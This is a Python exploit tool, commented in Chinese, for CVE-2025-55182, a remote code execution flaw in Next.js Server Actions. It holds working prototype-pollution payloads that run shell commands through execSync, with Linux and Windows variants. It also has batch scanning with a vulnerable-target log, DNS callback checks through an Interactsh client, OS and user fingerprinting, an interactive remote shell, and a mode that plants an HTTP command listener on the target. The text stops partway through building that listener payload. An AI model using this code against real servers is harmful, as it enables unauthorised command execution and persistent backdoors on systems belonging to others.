#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2025-55182漏洞执行任意命令
by:ruoji
https://github.com/RuoJi6/CVE-2025-55182-RCE-shell
"""

import requests
import base64
import re
import sys
import os
import argparse
import time
import uuid
import logging
import threading
import random
import string
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs, unquote, urljoin
from datetime import datetime
import queue


print_lock = threading.Lock()

write_queue = queue.Queue()
stop_writer = object()
file_lock = threading.Lock()
output_fh = open("vulnerable_targets.txt", "a", buffering=1)


# 启用 readline 支持（上下箭头浏览历史命令）
try:
    import readline
    # 设置历史记录大小
    readline.set_history_length(1000)
except ImportError:
    pass  # Windows 可能没有 readline

# 禁用 SSL 警告
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 配置日志 - 固定文件名，追加模式
LOG_FILE = "scan_errors.log"
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filemode='a'  # 追加模式
)
logger = logging.getLogger(__name__)
def writer_thread():
    with open("vulnerable_targets.txt", "a", buffering=1) as f:
        while True:
            item = write_queue.get()
            if item is stop_writer:
                break
            f.write(item + "\n")
            f.flush()


writer = threading.Thread(target=writer_thread)
writer.start()


# 线程锁（用于打印输出）
print_lock = threading.Lock()

class InteractshClient:
    """
    Interactsh 客户端 - 使用 RSA 加密进行正确的 API 交互
    支持 Nuclei 的 oast.pro 等服务器

    基于官方实现: https://github.com/projectdiscovery/interactsh
    """
    # 默认配置
    CORRELATION_ID_LENGTH = 20
    CORRELATION_ID_NONCE_LENGTH = 13

    def __init__(self, server="oast.pro"):
        """
        初始化 Interactsh 客户端
        """
        self.server = server
        self.session = requests.Session()
        self.session.verify = False  # 忽略 SSL 证书验证
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.correlation_id = None
        self.secret_key = None
        self.public_key = None
        self.private_key = None
        self.subdomain = None
        self.registered = False

    def _generate_correlation_id(self):
        """生成 xid 风格的 correlation ID"""
        import secrets
        import string
        chars = string.ascii_lowercase + string.digits
        return ''.join(secrets.choice(chars) for _ in range(self.CORRELATION_ID_LENGTH))

    def _generate_nonce(self):
        """生成随机 nonce"""
        import secrets
        import string
        chars = string.ascii_lowercase + string.digits
        return ''.join(secrets.choice(chars) for _ in range(self.CORRELATION_ID_NONCE_LENGTH))

    def register(self, silent=False):
        """使用 RSA 密钥对注册到 Interactsh 服务器"""
        try:
            from cryptography.hazmat.primitives.asymmetric import rsa
            from cryptography.hazmat.primitives import serialization
            from cryptography.hazmat.backends import default_backend
            import secrets

            # 生成 RSA 2048 位密钥对
            self.private_key = rsa.generate_private_key(
                public_exponent=65537, key_size=2048, backend=default_backend()
            )
            self.public_key = self.private_key.public_key()

            # 导出公钥 (PEM 格式)
            public_pem = self.public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            ).decode('utf-8')

            # 生成 correlation ID (20 字符，xid 风格)
            self.correlation_id = self._generate_correlation_id()
            # 生成 secret key (UUID 格式)
            self.secret_key = str(uuid.uuid4())
            # 生成完整子域名 (带 nonce)
            nonce = self._generate_nonce()
            self.subdomain = f"{self.correlation_id}{nonce}.{self.server}"

            # 注册请求
            register_url = f"https://{self.server}/register"
            register_data = {
                "public-key": base64.b64encode(public_pem.encode()).decode(),
                "secret-key": self.secret_key,
                "correlation-id": self.correlation_id
            }

            if not silent:
                print(f"[*] Registering to Interactsh: {self.server}")
            response = self.session.post(register_url, json=register_data, timeout=10, verify=False)

            if response.status_code == 200:
                result = response.json()
                if result.get('message') == 'registration successful':
                    self.registered = True
                    if not silent:
                        print(f"[+] \033[1;35m[Interactsh]\033[0m Registration successful!")
                        print(f"[+] Domain: \033[1;33m{self.subdomain}\033[0m")
                    return self.subdomain
                else:
                    if not silent:
                        print(f"[!] Response: {result}")
            else:
                if not silent:
                    print(f"[!] Registration returned {response.status_code}: {response.text[:100]}")
            return self.subdomain

        except ImportError:
            if not silent:
                print(f"[-] cryptography not installed. Run: pip install cryptography")
            return None
        except Exception as e:
            if not silent:
                print(f"[-] Registration failed: {str(e)}")
            if not self.subdomain:
                self.correlation_id = self._generate_correlation_id()
                nonce = self._generate_nonce()
                self.subdomain = f"{self.correlation_id}{nonce}.{self.server}"
            if not silent:
                print(f"[*] Using domain for manual verification: {self.subdomain}")
            return self.subdomain

    def _decrypt_aes_key(self, encrypted_key_b64):
        """使用 RSA-OAEP 解密 AES 密钥"""
        from cryptography.hazmat.primitives.asymmetric import padding
        from cryptography.hazmat.primitives import hashes
        encrypted_key = base64.b64decode(encrypted_key_b64)
        return self.private_key.decrypt(
            encrypted_key,
            padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
                        algorithm=hashes.SHA256(), label=None)
        )

    def _decrypt_message(self, aes_key, encrypted_data_b64):
        """使用 AES-CFB 解密消息"""
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        ciphertext = base64.b64decode(encrypted_data_b64)
        iv = ciphertext[:16]
        ciphertext = ciphertext[16:]
        cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        return (decryptor.update(ciphertext) + decryptor.finalize()).decode('utf-8')

    def check_interaction(self, timeout=10):
        """轮询检查 DNS 交互"""
        if not self.subdomain:
            return False

        print(f"[*] Waiting {timeout}s for DNS interaction...")
        time.sleep(timeout)

        if not self.registered:
            print(f"[!] Not registered with API, cannot auto-verify")
            print(f"[!] Domain: \033[1;33m{self.subdomain}\033[0m")
            print(f"[!] Manually check: https://app.interactsh.com")
            return None

        try:
            poll_url = f"https://{self.server}/poll?id={self.correlation_id}&secret={self.secret_key}"
            print(f"[*] Polling Interactsh API...")
            response = self.session.get(poll_url, timeout=10, verify=False)

            if response.status_code == 200:
                data = response.json()

                # 检查加密数据
                if data and 'aes_key' in data and data.get('data'):
                    try:
                        aes_key = self._decrypt_aes_key(data['aes_key'])
                        interactions = data['data']
                        interaction_count = 0

                        for encrypted_msg in interactions:
                            try:
                                plaintext = self._decrypt_message(aes_key, encrypted_msg)
                                interaction_count += 1

                                # 解析 JSON 提取关键信息
                                try:
                                    import json
                                    info = json.loads(plaintext)
                                    protocol = info.get('protocol', 'unknown').upper()
                                    q_type = info.get('q-type', '')
                                    remote_addr = info.get('remote-address', 'unknown')

                                    if interaction_count == 1:
                                        print(f"[+] \033[1;32mDNS interaction detected!\033[0m")
                                        print(f"[+] Protocol: {protocol}, Type: {q_type}, From: {remote_addr}")
                                except:
                                    if interaction_count == 1:
                                        print(f"[+] \033[1;32mDNS interaction detected!\033[0m")

                            except Exception as e:
                                pass

                        if interaction_count > 0:
                            if interaction_count > 1:
                                print(f"[+] Total interactions: {interaction_count}")
                            return True

                    except Exception as e:
                        print(f"[+] \033[1;32mDNS interaction detected (encrypted)!\033[0m")
                        return True

                # 检查未加密数据
                if data and 'data' in data and data['data'] and 'aes_key' not in data:
                    print(f"[+] \033[1;32mDNS interaction detected!\033[0m")
                    return True

                print(f"[-] No DNS interaction detected from target")
                return False
            else:
                print(f"[-] Poll failed: {response.status_code}")
                return None
        except Exception as e:
            print(f"[-] Error polling: {str(e)}")
            return None

    def check_interaction_silent(self, timeout=10):
        """静默检查 DNS 交互（用于多线程）"""
        if not self.subdomain:
            return False

        time.sleep(timeout)

        if not self.registered:
            return None

        try:
            poll_url = f"https://{self.server}/poll?id={self.correlation_id}&secret={self.secret_key}"
            response = self.session.get(poll_url, timeout=10, verify=False)

            if response.status_code == 200:
                data = response.json()

                # 检查加密数据
                if data and 'aes_key' in data and data.get('data'):
                    return True

                # 检查未加密数据
                if data and 'data' in data and data['data'] and 'aes_key' not in data:
                    return True

                return False
            else:
                return None
        except:
            return None


class NextJSRCEExploit:
    def __init__(self, target_url, path=None, use_echo=True, use_dnslog=False, silent=False, proxy=None):
        """
        初始化 Next.js RCE 利用工具

        Args:
            target_url: 目标 URL (例如: http://xxx)
            path: 自定义路径 (例如: /apps, /api/action)，如果为 None 则自动探测
            use_echo: 是否使用 Echo 验证
            use_dnslog: 是否使用 Interactsh DNSLog 验证
            silent: 静默模式（不打印中间信息）
            proxy: 代理地址 (例如: 127.0.0.1:8080)
        """
        self.base_url = target_url.rstrip('/')
        self.path = path
        self.target_url = None
        self.use_echo = use_echo
        self.use_dnslog = use_dnslog
        self.silent = silent
        self.proxy = proxy
        self.interactsh = None
        self.os_type = None  # 存储已检测的 OS 类型 (linux/windows/macos/bsd)
        self.session = requests.Session()
        # 忽略 SSL 证书验证
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0',
            'Next-Action': 'x',
            'X-Nextjs-Request-Id': 'b5dce965',
            'X-Nextjs-Html-Request-Id': 'SSTMXm7OJ_g0Ncx6jpQt9'
        })

        # 设置代理
        if proxy:
            # 如果代理地址已经包含协议，直接使用；否则添加 http://
            if proxy.startswith('http://') or proxy.startswith('https://'):
                proxy_url = proxy
            else:
                proxy_url = f"http://{proxy}"
            self.session.proxies = {
                'http': proxy_url,
                'https': proxy_url
            }
            if not silent:
                print(f"[*] Proxy: {proxy_url}")

        # 检查 URL 是否已经包含路径
        parsed_url = urlparse(self.base_url)
        url_has_path = parsed_url.path and parsed_url.path != '/'

        # 如果用户指定了 path 参数，使用用户指定的
        if self.path is not None:
            # 用户明确指定了路径
            self.target_url = f"{self.base_url}{self.path}"
        elif url_has_path:
            # URL 已经包含路径，直接使用
            self.target_url = self.base_url
            self.path = parsed_url.path
            if not silent:
                print(f"[*] Using path from URL: {self.path}")
        else:
            # 需要自动探测路径
            self.path = self._auto_detect_path()
            self.target_url = f"{self.base_url}{self.path}"

    def _auto_detect_path(self):
        """
        生成随机路径，不进行 302 跟随

        Returns:
            str: 随机生成的路径
        """
        # 直接使用随机路径
        random_path = '/' + ''.join(random.choices(string.ascii_lowercase, k=8))
        if not self.silent:
            print(f"[*] Using random path: {random_path}")
        return random_path
        
    def execute_command(self, command, chunked=False):
        """
        执行系统命令并返回结果

        Args:
            command: 要执行的 shell 命令
            chunked: 是否使用分段读取模式

        Returns:
            tuple: (success, result) - 成功标志和命令执行结果
        """
        success, result = self._execute_command_raw(command)

        # 检查是否需要分段读取（输出过长导致失败）
        if success and "未找到参数 'a'" in result:
            # 尝试分段读取
            return self._execute_command_chunked(command)

        return success, result

    def _execute_command_raw(self, command):
        """
        执行原始命令（不分段）
        自动检测 Linux/Windows 并使用对应的 base64 编码方式
        """
        # 如果已知 OS 类型，直接使用对应的方法
        if self.os_type == 'windows':
            return self._execute_command_windows(command)
        elif self.os_type in ['linux', 'macos', 'bsd']:
            return self._execute_command_linux(command)

        # 未知 OS 类型时，先尝试 Linux/macOS 方式
        success, result = self._execute_command_linux(command)
        if success and result and not result.startswith("未能从响应"):
            return success, result

        # 如果失败，尝试 Windows 方式 (PowerShell)
        return self._execute_command_windows(command)

    def _execute_command_linux(self, command):
        """
        执行命令 - Linux/macOS 方式 (使用 base64 -w 0)
        """
        # 构造 payload - 使用 base64 编码输出以避免特殊字符问题
        escaped_cmd = command.replace("'", "'\\''")
        payload_template = {
            "then": "$1:__proto__:then",
            "status": "resolved_model",
            "reason": -1,
            "value": '{"then":"$B1337"}',
            "_response": {
                "_prefix": f"var res=process.mainModule.require('child_process').execSync('{escaped_cmd} | base64 -w 0').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});",
                "_chunks": "$Q2",
                "_formData": {
                    "get": "$1:constructor:constructor"
                }
            }
        }
        return self._send_payload_request(payload_template)

    def _execute_command_windows(self, command):
        """
        执行命令 - Windows 方式 (使用 PowerShell Base64)
        """
        # Windows: 使用 PowerShell 进行 base64 编码
        # powershell -c "[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((cmd /c 'command')))"
        escaped_cmd = command.replace("'", "''").replace('"', '\\"')
        ps_cmd = f"powershell -c \\\"[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((cmd /c '{escaped_cmd}')))\\\""

        payload_template = {
            "then": "$1:__proto__:then",
            "status": "resolved_model",
            "reason": -1,
            "value": '{"then":"$B1337"}',
            "_response": {
                "_prefix": f"var res=process.mainModule.require('child_process').execSync('{ps_cmd}').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});",
                "_chunks": "$Q2",
                "_formData": {
                    "get": "$1:constructor:constructor"
                }
            }
        }
        return self._send_payload_request(payload_template)

    def _send_payload_request(self, payload_template):
        """
        发送 payload 请求并返回结果
        """

        # 构造 multipart/form-data 请求体
        boundary = '----WebKitFormBoundaryx8jO2oVc6SWP3Sad'

        # 手动构造 multipart body
        body_parts = []

        # Part 0: payload
        import json
        payload_json = json.dumps(payload_template, ensure_ascii=False)
        body_parts.append(f'------{boundary}')
        body_parts.append('Content-Disposition: form-data; name="0"')
        body_parts.append('')
        body_parts.append(payload_json)

        # Part 1: reference
        body_parts.append(f'------{boundary}')
        body_parts.append('Content-Disposition: form-data; name="1"')
        body_parts.append('')
        body_parts.append('"$@0"')

        # Part 2: empty array
        body_parts.append(f'------{boundary}')
        body_parts.append('Content-Disposition: form-data; name="2"')
        body_parts.append('')
        body_parts.append('[]')

        # 结束边界
        body_parts.append(f'------{boundary}--')

        body = '\r\n'.join(body_parts)

        # 设置 Content-Type
        headers = {
            'Content-Type': f'multipart/form-data; boundary=----{boundary}'
        }

        try:
            # 发送请求
            response = self.session.post(
                self.target_url,
                data=body.encode('utf-8'),
                headers=headers,
                allow_redirects=False,
                timeout=10
            )

            # 检查响应
            if response.status_code in [303, 307, 302]:
                # 从响应头中提取重定向 URL
                redirect_header = response.headers.get('x-action-redirect', '')

                if not redirect_header:
                    redirect_header = response.headers.get('Location', '')

                # 解析 base64 编码的结果
                result = self._extract_result(redirect_header)

                if result:
                    return True, result
                else:
                    return False, f"未能从响应中提取结果。响应头: {dict(response.headers)}"
            else:
                return False, f"意外的响应状态码: {response.status_code}\n响应内容: {response.text[:500]}"

        except requests.exceptions.RequestException as e:
            return False, f"请求失败: {str(e)}"

    def _execute_command_chunked(self, command):
        """
        分段执行命令并读取结果（用于输出过长的情况）

        问题：base64 编码后是单行，按行分段没用
        解决：按字节分段读取
        - 第1次：command | head -c 500
        - 第2次：command | tail -c +501 | head -c 500
        - ...
        """
        # 使用已存储的 OS 类型（在交互式 shell 启动时已检测）
        os_type = self.os_type if self.os_type else 'linux'

        all_output = []
        chunk_size = 500  # 每次读取的字节数（base64编码前）
        offset = 0
        max_chunks = 100  # 最多读取 100 次（50KB）

        for _ in range(max_chunks):
            if os_type == 'windows':
                # Windows: 使用 PowerShell 按字节读取
                if offset == 0:
                    chunked_cmd = f'powershell -c "({command})[0..{chunk_size-1}] -join \'\'"'
                else:
                    chunked_cmd = f'powershell -c "({command})[{offset}..{offset+chunk_size-1}] -join \'\'"'
            else:
                # Linux/Unix/macOS/BSD: 使用 head/tail 按字节读取
                if offset == 0:
                    chunked_cmd = f"{command} 2>&1 | head -c {chunk_size}"
                else:
                    chunked_cmd = f"{command} 2>&1 | tail -c +{offset + 1} | head -c {chunk_size}"

            success, result = self._execute_command_raw(chunked_cmd)

            if success and result and "未找到参数 'a'" not in result:
                all_output.append(result)
                # 如果返回字节数少于 chunk_size，说明已读完
                if len(result) < chunk_size:
                    break
                offset += chunk_size
            else:
                # 如果这是第一次就失败，返回错误
                if not all_output:
                    return False, "分段读取失败，输出可能过长"
                break

        if all_output:
            return True, ''.join(all_output)
        else:
            return False, "分段读取失败，输出可能过长"
    
    def _extract_result(self, redirect_url):
        """
        从重定向 URL 中提取并解码 base64 结果
        
        Args:
            redirect_url: 重定向 URL 或 x-action-redirect 头的值
            
        Returns:
            str: 解码后的命令执行结果
        """
        try:
            # 提取参数 a 的值
            # 格式: /login?a=BASE64_DATA;push 或 /login?a=BASE64_DATA
            match = re.search(r'[?&]a=([^;&]+)', redirect_url)
            
            if match:
                encoded_data = match.group(1)
                # URL 解码
                encoded_data = unquote(encoded_data)
                
                # Base64 解码
                try:
                    decoded = base64.b64decode(encoded_data).decode('utf-8', errors='ignore')
                    return decoded
                except Exception as e:
                    return f"Base64 解码失败: {str(e)}\n原始数据: {encoded_data}"
            else:
                return f"未找到参数 'a'。重定向 URL: {redirect_url}"
                
        except Exception as e:
            return f"提取结果时出错: {str(e)}"
    
    def verify_vulnerability(self):
        """
        验证漏洞是否存在（POC模式）
        -poc: 只用 Echo 验证
        --dnslog: 只用 DNSLog 验证
        -poc --dnslog: 两个都验证

        Returns:
            bool: 漏洞是否存在
        """
        print(f"[*] Testing vulnerability on {self.target_url}")

        echo_result = None
        dnslog_result = None

        # Echo 验证
        if self.use_echo:
            echo_result = self._do_echo_verify()
            if echo_result is True:
                # 检测操作系统类型
                os_type = self._detect_os()
                print(f"[+] \033[1;36mTip: You can use interactive shell with: -exp[x]\033[0m")
            elif echo_result is None:
                # 连接失败，如果没有启用 DNSLog，直接返回
                if not self.use_dnslog:
                    print(f"[-] \033[1;31mNOT VULNERABLE\033[0m (Connection failed)")
                    return False

        # DNSLog 验证
        if self.use_dnslog:
            print(f"\n[*] Interactsh DNSLog verification")

            # 初始化 Interactsh 客户端
            if not self.interactsh:
                print(f"[*] Initializing Interactsh client...")
                self.interactsh = InteractshClient(server="oast.pro")
                dnslog_domain = self.interactsh.register()

                if not dnslog_domain:
                    print(f"[-] \033[1;31mInteractsh registration failed\033[0m")
                    dnslog_result = False
                else:
                    dnslog_result = self._do_dnslog_verify(dnslog_domain)
            else:
                dnslog_result = self._do_dnslog_verify(self.interactsh.subdomain)

        # 判断最终结果
        if echo_result is True or dnslog_result is True:
            return True

        print(f"[-] \033[1;31mNOT VULNERABLE\033[0m")
        return False

    def verify_vulnerability_silent(self):
        """
        静默验证漏洞（用于多线程批量扫描）
        只返回结果，不打印任何信息

        Returns:
            tuple: (result, os_info)
                - result: True=漏洞存在, False=无漏洞, None=需手动验证
                - os_info: 操作系统信息（仅在漏洞存在时）
        """
        echo_result = None
        dnslog_result = None
        os_info = None
        connection_ok = None  # 连接状态

        # Echo 验证
        if self.use_echo:
            echo_result = self._do_echo_verify(silent=True)
            if echo_result is True:
                # 静默检测 OS
                os_info = self._detect_os_silent()
                connection_ok = True
            elif echo_result is None:
                # 连接失败
                connection_ok = False
                if not self.use_dnslog:
                    return False, None
            else:
                connection_ok = True  # 连接成功但无回显

        # DNSLog 验证
        if self.use_dnslog:
            # 如果只用 DNSLog（没有 Echo），先检测连接
            if not self.use_echo:
                connection_ok = self._check_connection_silent()
                if not connection_ok:
                    return False, None
            # 如果 Echo 已经检测连接失败，跳过 DNSLog
            elif connection_ok is False:
                return False, None

            if not self.interactsh:
                self.interactsh = InteractshClient(server="oast.pro")
                dnslog_domain = self.interactsh.register(silent=True)
                if not dnslog_domain:
                    dnslog_result = False
                else:
                    dnslog_result = self._do_dnslog_verify_silent(dnslog_domain)
            else:
                dnslog_result = self._do_dnslog_verify_silent(self.interactsh.subdomain)

        # 判断最终结果
        if echo_result is True or dnslog_result is True:
            return True, os_info

        return False, None

    def _check_connection_silent(self):
        """静默检测目标是否可连接"""
        try:
            response = self.session.get(
                self.target_url,
                timeout=10,
                allow_redirects=True
            )
            return response.status_code < 500
        except:
            return False

    def _detect_os_silent(self):
        """静默检测操作系统类型并执行用户信息命令"""
        os_type = None
        user_info = None

        # 尝试 uname -a (Linux/Mac/Unix)
        success, result = self.execute_command("uname -a")
        if success and result.strip():
            result_lower = result.lower()
            if 'linux' in result_lower:
                os_type = 'linux'
                os_info = f"Linux - {result.strip()[:50]}"
            elif 'darwin' in result_lower:
                os_type = 'macos'
                os_info = f"macOS - {result.strip()[:50]}"
            elif 'bsd' in result_lower:
                os_type = 'bsd'
                os_info = f"BSD - {result.strip()[:50]}"

        # 尝试 Windows 命令
        if not os_type:
            success, result = self.execute_command("ver")
            if success and result.strip() and 'windows' in result.lower():
                os_type = 'windows'
                os_info = f"Windows - {result.strip()[:50]}"

        if not os_type:
            return None

        # 根据 OS 类型执行用户信息命令
        if os_type in ['linux', 'macos', 'bsd']:
            success, result = self.execute_command("id")
            if success and result.strip():
                user_info = result.strip()[:80]
        elif os_type == 'windows':
            success, result = self.execute_command("whoami")
            if success and result.strip():
                user_info = result.strip()[:80]

        # 组合返回信息
        if user_info:
            return f"{os_info} | {user_info}"
        return os_info

    def _do_dnslog_verify_silent(self, dnslog_domain):
        """静默执行 DNSLog 验证"""
        test_command = f"nslookup {dnslog_domain}"
        try:
            self.execute_command(test_command)
            if self.interactsh.check_interaction_silent(timeout=8):
                return True
            return False
        except:
            if self.interactsh and self.interactsh.subdomain:
                if self.interactsh.check_interaction_silent(timeout=5):
                    return True
            return False

    def _do_echo_verify(self, silent=False):
        """执行 Echo 验证"""
        test_string = "VULN_TEST_123456"
        test_command = f"echo {test_string}"

        if not silent:
            print(f"[*] Echo verification")
            print(f"[*] Executing test command: {test_command}")

        success, result = self.execute_command(test_command)

        if success and test_string in result:
            if not silent:
                print(f"[+] \033[1;32mVULNERABLE!\033[0m Target is exploitable (Echo verification)")
                print(f"[+] Response: {result.strip()}")
            return True
        else:
            if not silent:
                print(f"[-] Echo verification failed")
                if not success:
                    print(f"[-] Error: {result}")
            # 检查是否是连接错误
            connection_errors = ['timed out', 'timeout', 'Connection refused', 'Connection reset',
                                 'No route to host', 'Network is unreachable', 'Name or service not known',
                                 'Max retries exceeded', 'SSLError', 'ConnectionError']
            if not success and any(err.lower() in result.lower() for err in connection_errors):
                if not silent:
                    print(f"[-] \033[1;31mConnection failed\033[0m")
                return None  # 返回 None 表示连接失败
            return False

    def _do_dnslog_verify(self, dnslog_domain):
        """执行 DNSLog 验证"""
        test_command = f"nslookup {dnslog_domain}"

        print(f"[*] Command: {test_command}")
        print(f"[*] Sending DNS trigger payload...")

        try:
            success, result = self.execute_command(test_command)
            print(f"[*] Payload sent, checking for DNS interaction...")

            if self.interactsh.check_interaction(timeout=8):
                print(f"[+] \033[1;32mVULNERABLE!\033[0m DNS interaction detected")
                print(f"[+] DNSLog domain: {dnslog_domain}")
                return True
            else:
                print(f"[-] No DNS interaction detected")
                return False

        except Exception as e:
            print(f"[-] Error during DNSLog verification: {str(e)}")
            print(f"[*] Checking DNS interaction despite error...")
            if self.interactsh and self.interactsh.subdomain:
                if self.interactsh.check_interaction(timeout=5):
                    print(f"[+] \033[1;32mVULNERABLE!\033[0m DNS interaction detected despite error")
                    return True
            return False

    def _detect_os(self):
        """检测目标操作系统类型并执行对应的用户信息命令"""
        print(f"[*] Detecting target OS...")

        os_type = None

        # 方法1: 尝试 uname -a (Linux/Mac/Unix)
        success, result = self.execute_command("uname -a")
        if success and result.strip():
            result_lower = result.lower()
            if 'linux' in result_lower:
                print(f"[+] \033[1;32mOS: Linux\033[0m")
                print(f"[+] {result.strip()}")
                os_type = 'linux'
            elif 'darwin' in result_lower:
                print(f"[+] \033[1;32mOS: macOS\033[0m")
                print(f"[+] {result.strip()}")
                os_type = 'macos'
            elif 'bsd' in result_lower:
                print(f"[+] \033[1;32mOS: BSD\033[0m")
                print(f"[+] {result.strip()}")
                os_type = 'bsd'

        # 方法2: 尝试 Windows 命令
        if not os_type:
            success, result = self.execute_command("ver")
            if success and result.strip() and 'windows' in result.lower():
                print(f"[+] \033[1;32mOS: Windows\033[0m")
                print(f"[+] {result.strip()}")
                os_type = 'windows'

        # 方法3: 尝试 systeminfo (Windows)
        if not os_type:
            success, result = self.execute_command("systeminfo | findstr /B /C:\"OS Name\"")
            if success and result.strip() and 'windows' in result.lower():
                print(f"[+] \033[1;32mOS: Windows\033[0m")
                print(f"[+] {result.strip()}")
                os_type = 'windows'

        # 方法4: 尝试获取更多 Linux 信息
        if not os_type:
            success, result = self.execute_command("cat /etc/os-release 2>/dev/null | head -2")
            if success and result.strip():
                print(f"[+] \033[1;32mOS: Linux\033[0m")
                print(f"[+] {result.strip()}")
                os_type = 'linux'

        if not os_type:
            print(f"[*] \033[1;33mOS: Unknown\033[0m (could not determine)")
            os_type = 'unknown'

        # 存储 OS 类型供分段读取使用
        self.os_type = os_type

        # 根据 OS 类型执行用户信息命令
        self._execute_user_info(os_type)

        return os_type

    def _execute_user_info(self, os_type):
        """根据操作系统类型执行用户信息命令"""
        if os_type in ['linux', 'macos', 'bsd']:
            # Linux/Unix: 执行 id
            print(f"[*] Executing: id")
            success, result = self.execute_command("id")
            if success and result.strip():
                print(f"[+] \033[1;36m{result.strip()}\033[0m")
        elif os_type == 'windows':
            # Windows: 执行 whoami
            print(f"[*] Executing: whoami")
            success, result = self.execute_command("whoami")
            if success and result.strip():
                print(f"[+] \033[1;36m{result.strip()}\033[0m")

    def interactive_shell(self):
        """
        启动交互式 shell (EXP模式)
        先验证是否支持回显，不支持则提示使用 dnslog
        """
        print(f"[*] Checking if target supports echo (required for interactive shell)...")

        echo_result = self._do_echo_verify(silent=True)

        if echo_result is None:
            print(f"[-] \033[1;31mConnection failed!\033[0m Cannot connect to target")
            print(f"[-] Interactive shell is not available")
            return

        if echo_result is False:
            print(f"[-] \033[1;33mTarget does not support echo output\033[0m")
            print(f"[-] Interactive shell requires echo to display command results")
            print(f"[*] \033[1;36mTip: Use --dnslog to verify vulnerability via DNS interaction\033[0m")
            print(f"[*] Example: python {sys.argv[0]} --dnslog {self.base_url}")
            return

        print(f"[+] \033[1;32mVULNERABLE!\033[0m Target supports echo")

        # 检测操作系统
        os_type = self._detect_os()

        print(f"\n[+] Starting interactive shell...")
        print("Type 'exit' or 'quit' to exit\n")

        while True:
            try:
                # 读取用户输入
                command = input("$ ").strip()

                if not command:
                    continue

                # 检查退出命令
                if command.lower() in ['exit', 'quit']:
                    break

                # 执行命令
                success, result = self.execute_command(command)

                if success:
                    print(result)
                else:
                    print(f"Error: {result}", file=sys.stderr)

            except KeyboardInterrupt:
                print("\n")
                break
            except EOFError:
                print("")
                break
            except Exception as e:
                print(f"Error: {str(e)}", file=sys.stderr)

    def _print_exp_banner(self, mode):
        """打印 EXP 模式的 Banner"""
        banners = {
            'exp': {
                'title': 'EXP Mode - Base64 Echo',
                'tech': 'Prototype Pollution + execSync + Base64 Output',
                'desc': 'Execute command via Next.js Server Action vulnerability',
                'color': '\033[1;32m'  # 绿色
            },
            'exp2': {
                'title': 'EXP2 Mode - HTTP Hijack (Base64)',
                'tech': 'HTTP Server Hijack + POST Request + Base64 Encoding',
                'desc': 'Inject HTTP listener and execute commands via custom endpoint',
                'color': '\033[1;33m'  # 黄色
            },
            'exp3': {
                'title': 'EXP3 Mode - HTTP Hijack (AES-256-CBC)',
                'tech': 'HTTP Server Hijack + POST Request + AES-256-CBC Encryption',
                'desc': 'Inject encrypted HTTP listener for secure command execution',
                'color': '\033[1;35m'  # 紫色
            }
        }

        b = banners.get(mode, banners['exp'])
        color = b['color']
        reset = '\033[0m'

        print()
        print(f"{color}╔{'═' * 62}╗{reset}")
        print(f"{color}║{reset}  {b['title']:^58}  {color}║{reset}")
        print(f"{color}╠{'═' * 62}╣{reset}")
        print(f"{color}║{reset}  Tech: {b['tech']:<52}  {color}║{reset}")
        print(f"{color}║{reset}  Desc: {b['desc']:<52}  {color}║{reset}")
        print(f"{color}╚{'═' * 62}╝{reset}")
        print()

    def execute_command_v2(self, command):
        """
        EXP2 模式执行单命令 (HTTP hijack + POST + Base64)
        支持本地配置缓存
        """
        # 打印 Banner
        self._print_exp_banner('exp2')

        # 尝试加载本地配置
        saved_path, _, _ = self._load_exp2_config()

        parsed = urlparse(self.base_url)

        # 如果有保存的配置，先测试是否有效
        if saved_path:
            exec_url = f"{parsed.scheme}://{parsed.netloc}{saved_path}"
            print(f"[*] Step 1: Checking saved configuration...")
            print(f"    └── Saved path: {saved_path}")
            try:
                # 使用 echo 随机字符串验证配置
                test_token = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
                cmd_b64 = base64.b64encode(f'echo {test_token}'.encode()).decode()
                resp = self.session.post(exec_url, data=cmd_b64, timeout=5)
                if resp.status_code == 200:
                    result = resp.json()
                    stdout_result = result.get('stdout', '')
                    # 检查返回值是否包含我们的随机字符串
                    if result.get('success') and test_token in stdout_result:
                        print(f"    └── \033[1;32m✓ Config valid! (echo verified)\033[0m")
                        print()
                        print(f"[*] Step 2: Executing command...")
                        print(f"    └── Command: {command}")
                        # 执行实际命令
                        cmd_b64 = base64.b64encode(command.encode('utf-8')).decode()
                        resp = self.session.post(exec_url, data=cmd_b64, timeout=30)
                        if resp.status_code == 200:
                            result = resp.json()
                            if result.get('success'):
                                print(f"    └── \033[1;32m✓ Success!\033[0m")
                                print()
                                return True, result.get('stdout', '') + result.get('stderr', '')
                            else:
                                return False, result.get('error', 'Unknown error')
                        return False, f"HTTP {resp.status_code}"
            except:
                pass
            print(f"    └── \033[1;31m✗ Config invalid, need re-injection\033[0m")
            print()

        # 生成新的随机路径
        random_path = '/' + ''.join(random.choices(string.ascii_lowercase, k=8))

        print(f"[*] Step 1: Generating payload...")
        print(f"    ├── Random path: {random_path}")
        print(f"    └── Encoding: Base64")

        # 构造 payload
